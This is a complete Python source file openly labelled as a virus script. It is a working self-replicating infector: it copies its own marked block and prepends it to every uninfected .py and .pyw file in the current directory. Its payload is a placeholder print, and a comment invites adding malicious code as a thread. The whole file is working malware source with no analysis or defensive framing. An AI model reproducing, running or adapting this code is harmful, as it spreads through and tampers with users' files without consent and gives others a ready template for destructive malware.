### START OF VIRUS SCRIPT ###

import sys, glob

code=[]
with open(sys.argv[0],'r') as f:
     lines= f.readlines()

virus_area=False
for line in lines:
     if line == '### START OF VIRUS SCRIPT ###\n':
          virus_area = True
     if virus_area:
          code.append(line)
     if line == '### END OF VIRUS SCRIPT ###':
          break

python_scripts = glob.glob('*.py')+glob.glob('*.pyw')

for script in python_scripts:
     with open(script, 'r') as f:
          script_code = f.readlines()

     infected=False
     for line in script_code:
          if line == '### START OF VIRUS SCRIPT ###\n':
               infected=True
               break
     if not infected:
          final_code=[]
          final_code.extend(code)
          final_code.extend('\n')
          final_code.extend(script_code)

          with open(script, 'w') as f:
               f.writelines(final_code)

# MALICIOUS CODE/ PAYLOAD IS INSERTED BELOW USING THREADING FUNCTIONALITY
print('I SEE YOU')
# IT IS BEST YOU ADD IT AS A THREAD TO ENABLE ASYNCHRONOUS NATURE OF THE CODE

### END OF VIRUS SCRIPT ###